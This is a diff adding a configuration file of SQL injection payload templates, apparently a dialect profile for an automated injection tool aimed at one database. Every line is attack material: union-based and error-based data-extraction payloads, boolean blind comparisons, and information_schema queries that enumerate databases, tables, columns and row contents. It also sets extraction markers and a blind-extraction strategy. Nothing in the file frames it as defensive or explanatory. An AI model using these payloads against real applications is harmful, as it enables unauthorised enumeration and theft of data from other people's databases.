@@ -1,0 +1,31 @@
+exists_table: exists(select 1 from {table})
+exists_column: exists(select {cols} from {table})
+UnionFillStr:NULL
+UnionAll:1=2 union all select {cols}
+UnionData:1=2 union all select {cols} from {db}.{table}{where} limit 1 offset {rowIndex}
+ErrorData:1=ROTATELEFT(CAST((char(94)||char(94)||char(33)||({cols})||char(33)||char(94)||char(94)) AS INT),1)
+BoolData:{expr}>{value}
+DataSplitStr:_s_p_
+DataStartStr:data_
+DataEndStr:_data
+DBCount:(select count(distinct(table_schema)) from information_schema.tables)
+TableCount:(select count(1) from information_schema.tables where table_schema={db})
+ColumnCount:(select count(1) from information_schema.columns where table_schema={db} and table_name={table})
+DBName:(select distinct(table_schema) from information_schema.tables limit 1 offset {index})
+DBNames:(select listagg(distinct(table_schema),',') from information_schema.tables)
+TableName:(select table_name from information_schema.tables where table_schema={db} limit 1 offset {index})
+TableNames:(select listagg(table_name,',') from information_schema.tables where table_schema={db})
+ColumnName:(select column_name from information_schema.columns where table_schema={db} and table_name={table} limit 1 offset {index})
+ColumnNames:(select listagg(column_name,',') from information_schema.columns where table_schema={db} and table_name={table})
+Substr:substring(cast({expr} as varchar),{start},{len})
+Concat:{startMark}||{split}||{cols}||{split}||{endMark}
+Length:length(cast({expr} as varchar))
+Cast:cast({expr} as varchar)
+IfNull:coalesce({expr},char(32))
+Ascii:ascii({expr})
+Hex:rawtohex(stringtoutf8(cast({expr} as varchar)))
+DataValue:(select {cols} from {db}.{table}{where} limit 1 offset {rowIndex})
+DataCount:(select count(1) from {db}.{table}{where})
+ErrorChunkLen:0
+BlindStrategy: codepoint
+DnsChannel: no
